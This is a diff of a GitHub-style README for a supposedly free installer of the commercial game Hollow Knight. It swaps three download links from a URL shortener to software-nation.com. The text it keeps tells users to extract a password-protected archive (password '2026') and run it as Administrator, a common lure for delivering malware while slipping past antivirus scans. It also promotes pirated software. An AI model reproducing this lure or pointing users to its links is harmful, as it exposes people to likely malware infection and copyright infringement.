@@ -9,7 +9,7 @@ The **🦋 Hollow Knight Latest Version** is a **free** installer for the critic
 
 <div align="center">
 
-[![Download Hollow Knight Latest Version](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/hollow-knigh-latest-version)
+[![Download Hollow Knight Latest Version](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/hollow-knigh-latest-version)
 
 </div>
 
@@ -96,7 +96,7 @@ Experience one of the most beloved indie games of all time — Hollow Knight. Th
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Follow setup wizard → Play
 
-[![Download Hollow Knight Latest Version](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/hollow-knigh-latest-version)
+[![Download Hollow Knight Latest Version](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/hollow-knigh-latest-version)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -224,7 +224,7 @@ Experience the acclaimed indie masterpiece for free. **Hollow Knight Latest Vers
 
 <div align="center">
 
-[![Download Hollow Knight Latest Version](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/hollow-knigh-latest-version)
+[![Download Hollow Knight Latest Version](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/hollow-knigh-latest-version)
 
 **Version 4.6.1** — Complete game installer. April 2026 update. Zero cost. No payment.
 
